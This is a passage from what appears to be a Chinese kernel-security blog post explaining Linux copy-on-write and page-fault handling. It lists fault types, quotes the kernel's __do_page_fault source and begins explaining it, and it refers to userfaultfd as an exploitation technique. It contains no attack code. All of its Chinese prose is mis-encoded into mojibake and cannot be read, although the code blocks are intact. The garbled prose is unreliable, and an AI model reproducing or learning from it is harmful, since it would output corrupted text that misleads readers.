¸ä¼šä¸ºå…¶åˆ†é…æ–°çš„é¡µæ¡†ã€‚</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230807101650345.png"                      alt="image-20230807101650345"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230807101734100.png"                      alt="image-20230807101734100"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230807101837765.png"                      alt="image-20230807101837765"                ></p><p>ä»¥ä¸Šå°±æ˜¯å†™æ—¶å¤åˆ¶çš„åŸºæœ¬æµç¨‹ï¼Œå¤§å¤§çš„å‡å°‘äº†ç³»ç»Ÿçš„å¼€é”€ã€‚</p><h3 id="mmap-ä¸-COW"><a href="#mmap-ä¸-COW" class="headerlink" title="mmap ä¸ COW"></a>mmap ä¸ COW</h3><p>åœ¨ä¸Šæ–‡ä¸­æƒ³å¿…å„ä½éƒ½çœ‹åˆ°äº†ä¸€ä¸ªéå¸¸ç†Ÿæ‚‰çš„è¯<code>ç¼ºé¡µå¼‚å¸¸</code>ï¼Œå…¶å®åœ¨åŸå…ˆçš„æ–‡ç« ä¸­æˆ‘ä»¬å·²ç»é‡åˆ°è¿‡äº†ç¼ºé¡µå¼‚å¸¸ä¹Ÿæ˜¯å¸¸ç”¨çš„<code>userfaultfd</code>æœºåˆ¶ã€‚ç„¶è€Œå½“æ—¶æˆ‘ä»¬åˆ›å»ºçš„æ˜¯<code>PROT_READ|PROT_WRITE</code>ï¼Œå½“æˆ‘ä»¬æ˜ å°„ä¸€ä¸ªåªæœ‰è¯»æƒé™çš„æ–‡ä»¶ï¼Œè‹¥æ˜¯æˆ‘ä»¬æ­¤æ—¶å‘æ˜ å°„ä¸­å†™å…¥å†…å®¹æ—¶åŒæ ·ä¼šè§¦å‘å†™æ—¶å¤åˆ¶çš„æœºåˆ¶ï¼Œå°†æ–‡ä»¶å†…å®¹æ‹·è´åˆ°å†…å­˜ä¸­ï¼Œæ­¤æ—¶è¿›ç¨‹å¯¹è¿™å—åŒºåŸŸçš„è¯»å†™ä¾¿ä¸ä¼šå½±å“ç£ç›˜ä¸­çš„æ–‡ä»¶äº†ã€‚</p><h2 id="ç¼ºé¡µå¼‚å¸¸-amp-write"><a href="#ç¼ºé¡µå¼‚å¸¸-amp-write" class="headerlink" title="ç¼ºé¡µå¼‚å¸¸&amp;write"></a>ç¼ºé¡µå¼‚å¸¸&amp;write</h2><p>åœ¨ä»¥å‰å†™è¿‡çš„<code>userfaultfd</code>è¿™ä¸€åˆ©ç”¨æ–¹æ³•çš„æ—¶å€™å¹¶æ²¡æœ‰åˆ†æè¿‡ç¼ºé¡µå¼‚å¸¸çš„åŸç†æ›´åˆ«ææºç åˆ†æäº†ï¼Œæ‰€ä»¥è¿™æ¬¡æ­£å¥½å†™ä¸€ä¸‹ã€‚</p><p>åœ¨CPUä¸­ä½¿ç”¨MMUè¿›è¡Œè™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„ï¼Œç„¶è€Œåœ¨ç³»ç»Ÿä¸­å¹¶ä¸æ˜¯æ‰€æœ‰çš„è™šæ‹Ÿå†…å­˜é¡µé¢éƒ½æœ‰å¯¹åº”çš„ç‰©ç†å†…å­˜é¡µï¼Œå½“è½¯ä»¶è¯•å›¾è®¿é—®å·²ç»è¢«æ˜ å°„åœ¨è™šæ‹Ÿå†…å­˜ä¸­ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¢«åŠ è½½åˆ°ç‰©ç†å†…å­˜ä¸­çš„ä¸€ä¸ªåˆ†é¡µæ—¶ï¼ŒMMUæ— æ³•å®Œæˆç”±è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜ä¹‹é—´çš„è½¬åŒ–ï¼Œæ­¤æ—¶ä¾¿ä¼šäº§ç”Ÿ<strong>ç¼ºé¡µå¼‚å¸¸</strong>ã€‚</p><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><p>é‚£ä¹ˆè§¦å‘ç¼ºé¡µå¼‚å¸¸ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š</p><ol><li>  çº¿æ€§åœ°å€ä¸åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­</li><li>  çº¿æ€§åœ°å€åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿ</li><li>  çº¿æ€§åœ°å€åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œä½†æ˜¯æ²¡æœ‰ä¸ç‰©ç†åœ°å€ä¹‹é—´å»ºç«‹æ˜ å°„</li></ol><p>å…¶ç±»å‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ï¼š</p><ol><li><p>è½¯æ€§ç¼ºé¡µå¼‚å¸¸</p><p>  è½¯æ€§ç¼ºé¡µå¼‚å¸¸æŒ‡çš„æ˜¯ç›¸å…³é¡µå·²ç»è¢«è½½å…¥åˆ°äº†å†…å­˜ä¸­ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åœ¨MMUä¸­æ³¨å†Œï¼Œæ­¤æ—¶åªéœ€è¦å‘MMUæ³¨å†Œç›¸å…³çš„ç‰©ç†é¡µå³å¯ã€‚</p><p>  ä¸»è¦å‡ºç°åœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š</p><ol><li>  ä¸¤ä¸ªè¿›ç¨‹å…±äº«ç›¸åŒçš„ç‰©ç†é¡µæ¡†ï¼Œå†…æ ¸ä¸ºå…¶ä¸­ä¸€ä¸ªæ³¨å†Œäº†ç‰©ç†é¡µï¼Œä½†æ˜¯æ²¡æœ‰ä¸ºå¦å¤–ä¸€ä¸ªæ³¨å†Œ</li><li>  è¯¥é¡µå·²ç»è¢«CPUçš„å·¥ä½œé›†ä¸­ç§»é™¤ï¼Œä½†æ˜¯å°šæœªäº¤æ¢åˆ°ç£ç›˜ä¸Šï¼Œè‹¥æ˜¯ç¨‹åºé‡æ–°ä½¿ç”¨è¯¥é¡µåˆ™å¦éœ€å‘MMUæ³¨å†Œ</li></ol></li><li><p>ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸</p><p>  ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸åˆ™æ„å‘³ç€ä½¿ç”¨çš„é¡µå¹¶æ²¡æœ‰è¢«è½½å…¥åˆ°å†…å­˜ä¸­ï¼Œæ­¤æ—¶æ“ä½œç³»ç»Ÿåˆ™éœ€è¦è®²ä¸€ä¸ªåˆé€‚å¹¶ä¸”ç©ºé—²çš„ç‰©ç†é¡µè½½å…¥è¿›å†…å­˜ä¸­ï¼Œéšåå‘è¯¥é¡µä¸­å†™å…¥å†…å®¹ï¼Œå¹¶åœ¨MMUä¸­æ³¨å†Œã€‚ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸çš„å¼€é”€æå¤§ï¼Œå› æ­¤éƒ¨åˆ†æ“ä½œç³»ç»Ÿä¹Ÿä¼šé‡‡å–å»¶è¿Ÿé¡µè½½å…¥çš„ç­–ç•¥â€”â€”åªæœ‰åˆ°ä¸‡ä¸å¾—å·²æ—¶æ‰ä¼šåˆ†é…æ–°çš„ç‰©ç†é¡µï¼Œè¿™ä¹Ÿæ˜¯ Linux å†…æ ¸çš„åšæ³•ã€‚è‹¥æ˜¯é¢‘ç¹åœ°å‘ç”Ÿç¡¬æ€§ç¼ºé¡µå¼‚å¸¸åˆ™ä¼šå¼•å‘ç³»ç»Ÿé¢ ç°¸ï¼Œå› èµ„æºè€—å°½è€Œæ— æ³•æ­£å¸¸å®Œæˆå·¥ä½œã€‚</p></li><li><p>æ— æ•ˆç¼ºé¡µå¼‚å¸¸</p><p>  æ„å‘³ç€è¿›ç¨‹è®¿é—®äº†ä¸€ä¸ªæ— æ•ˆçš„å†…å­˜åœ°å€ï¼Œæ­¤æ—¶kernelä¼šå‘è¿›ç¨‹å‘é€<code>SIGSEGV</code>ä¿¡å·ã€‚</p></li></ol><h3 id="å¤„ç†ç¼ºé¡µå¼‚å¸¸"><a href="#å¤„ç†ç¼ºé¡µå¼‚å¸¸" class="headerlink" title="å¤„ç†ç¼ºé¡µå¼‚å¸¸"></a>å¤„ç†ç¼ºé¡µå¼‚å¸¸</h3><p>é’ˆå¯¹æ–‡æœ¬çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†çš„æµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__do_page_fault() =&gt; __handle_mm_fault() =&gt; handle_pte_fault() =&gt; do_fault() =&gt; do_read_fault()/do_ww_fault()/do_shared_fault()</span><br></pre></td></tr></table></figure><p>ä»å¤´å¾€åçœ‹ï¼Œé¦–å…ˆçœ‹<code>__do_page_fault</code>å‡½æ•°ã€‚</p><h4 id="do-page-fault"><a href="#do-page-fault" class="headerlink" title="__do_page_fault"></a><strong>__do_page_fault</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> noinline <span class="keyword">void</span></span><br><span class="line">__do_page_fault(struct pt_regs *regs, <span class="keyword">unsigned</span> <span class="keyword">long</span> error_code,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line"><span class="keyword">int</span> fault, major = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;</span><br><span class="line"></span><br><span class="line">tsk = current;</span><br><span class="line">mm = tsk-&gt;mm;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Detect and handle instructions that would cause a page fault for</span></span><br><span class="line"><span class="comment"> * both a tracked kernel page and a userspace page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (kmemcheck_active(regs))</span><br><span class="line">kmemcheck_hide(regs);</span><br><span class="line">prefetchw(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(kmmio_fault(regs, address)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We fault-in kernel-space virtual memory on-demand. The</span></span><br><span class="line"><span class="comment"> * &#x27;reference&#x27; page table is init_mm.pgd.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NOTE! We MUST NOT take any locks for this case. We may</span></span><br><span class="line"><span class="comment"> * be in an interrupt or a critical region, and should</span></span><br><span class="line"><span class="comment"> * only copy the information from the master page table,</span></span><br><span class="line"><span class="comment"> * nothing more.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This verifies that the fault happens in kernel space</span></span><br><span class="line"><span class="comment"> * (error_code &amp; 4) == 0, and that the fault was not a</span></span><br><span class="line"><span class="comment"> * protection error (error_code &amp; 9) == 0.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;</span><br><span class="line"><span class="keyword">if</span> (vmalloc_fault(address) &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmemcheck_fault(regs, address, error_code))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Can handle a stale RO-&gt;RW TLB: */</span></span><br><span class="line"><span class="keyword">if</span> (spurious_fault(error_code, address))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line"><span class="keyword">if</span> (kprobes_fault(regs))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don&#x27;t take the mm semaphore here. If we fixup a prefetch</span></span><br><span class="line"><span class="comment"> * fault we could otherwise deadlock:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(kprobes_fault(regs)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))</span><br><span class="line">pgtable_bad(regs, error_code, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we&#x27;re in an interrupt, have no user context or are running</span></span><br><span class="line"><span class="comment"> * in a region with pagefaults disabled then we must not take the fault</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span></span><br><span class="line"><span class="comment"> * vmalloc fault has been handled.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * User-mode registers count as a user access even for any</span></span><br><span class="line"><span class="comment"> * potential system fault or CPU buglet:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (user_mode(regs)) &#123;</span><br><span class="line">local_irq_enable();</span><br><span class="line">error_code |= PF_USER;</span><br><span class="line">flags |= FAULT_FLAG_USER;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">local_irq_enable();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="number">1</span>, regs, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_WRITE)</span><br><span class="line">flags |= FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When running in the kernel we expect faults to occur only to</span></span><br><span class="line"><span class="comment"> * addresses in user space.  All other faults represent errors in</span></span><br><span class="line"><span class="comment"> * the kernel and should generate an OOPS.  Unfortunately, in the</span></span><br><span class="line"><span class="comment"> * case of an erroneous fault occurring in a code path which already</span></span><br><span class="line"><span class="comment"> * holds mmap_sem we will deadlock attempting to validate the fault</span></span><br><span class="line"><span class="comment"> * against the address space.  Luckily the kernel only validly</span></span><br><span class="line"><span class="comment"> * references user space from well defined areas of code, which are</span></span><br><span class="line"><span class="comment"> * listed in the exceptions table.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * As the vast majority of faults will be valid we will only perform</span></span><br><span class="line"><span class="comment"> * the source reference check when there is a possibility of a</span></span><br><span class="line"><span class="comment"> * deadlock. Attempt to lock the address space, if we cannot we then</span></span><br><span class="line"><span class="comment"> * validate the source. If this is invalid we can skip the address</span></span><br><span class="line"><span class="comment"> * space check, thus avoiding the deadlock:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;</span><br><span class="line"><span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The above down_read_trylock() might have succeeded in</span></span><br><span class="line"><span class="comment"> * which case we&#x27;ll have missed the might_sleep() from</span></span><br><span class="line"><span class="comment"> * down_read():</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">might_sleep();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vma = find_vma(mm, address);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!vma)) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))</span><br><span class="line"><span class="keyword">goto</span> good_area;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_USER) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Accessing the stack below %sp is always a bug.</span></span><br><span class="line"><span class="comment"> * The large cushion allows instructions like enter</span></span><br><span class="line"><span class="comment"> * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span></span><br><span class="line"><span class="comment"> * 32 pointers and then decrements %sp by 65535.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) &lt; regs-&gt;sp)) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ok, we have a good vm_area for this memory access, so</span></span><br><span class="line"><span class="comment"> * we can handle it..</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">good_area:</span><br><span class="line"><span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">bad_area_access_error(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If for any reason at all we couldn&#x27;t handle the fault,</span></span><br><span class="line"><span class="comment"> * make sure we exit gracefully rather than endlessly redo</span></span><br><span class="line"><span class="comment"> * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span></span><br><span class="line"><span class="comment"> * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">major |= fault &amp; VM_FAULT_MAJOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we need to retry the mmap_sem has already been released,</span></span><br><span class="line"><span class="comment"> * and if there is a fatal signal pending there is no guarantee</span></span><br><span class="line"><span class="comment"> * that we made any progress. Handle this case first.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;</span><br><span class="line"><span class="comment">/* Retry at most once */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">flags |= FAULT_FLAG_TRIED;</span><br><span class="line"><span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* User mode? Just return to handle the fatal exception */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Not returning to user mode? Handle exceptions or die: */</span></span><br><span class="line">no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;</span><br><span class="line">mm_fault_error(regs, error_code, address, fault);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Major/minor page fault accounting. If any of the events</span></span><br><span class="line"><span class="comment"> * returned VM_FAULT_MAJOR, we account it as a major fault.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (major) &#123;</span><br><span class="line">tsk-&gt;maj_flt++;</span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="number">1</span>, regs, address);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">tsk-&gt;min_flt++;</span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="number">1</span>, regs, address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_v8086_mode(regs, address, tsk);</span><br><span class="line">&#125;</span><br><span class="line">NOKPROBE_SYMBOL(__do_page_fault);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆéœ€è¦çŸ¥é“çš„æ˜¯<code>vma</code>è¡¨ç¤ºçš„æ˜¯çº¿æ€§åŒºæè¿°ç¬¦ï¼Œ<code>tsk</code>è¡¨ç¤ºçš„æ˜¯å¾ˆç†Ÿæ‚‰çš„<code>task_struct</code>,<code>mm</code>ä¹Ÿæ˜¯å‰é¢æ–‡ç« ä¸­æåˆ°è¿‡çš„<code>mm_struct</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡è¿™æ ·ä¸€æ¡è¯­å¥åˆå§‹åŒ–flagsï¼Œéšååˆå§‹åŒ–ä¸Šè¿°çš„å˜é‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT)))&#123;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™æ¡è¯­å¥ä»¥åŠéªŒè¯<code>error_code</code>åˆ¤æ–­ç¼ºé¡µå¼‚å¸¸æ˜¯å¦å‘ç”Ÿåœ¨å†…æ ¸ç©ºé—´ï¼Œè€Œ<code>PF_RSVD | PF_USER | PF_PROT</code>çš„å«ä¹‰åˆ†åˆ«è¡¨ç¤º<code>é¡µè¡¨é¡¹ä¿ç•™ ï½œ ç”¨æˆ·é¡µå¼‚å¸¸ ï½œ é¡µä¿æŠ¤å¼‚å¸¸</code>ã€‚å¦‚æœåˆ¤æ–­ç»“æœè®¤å®šä¸ºå†…æ 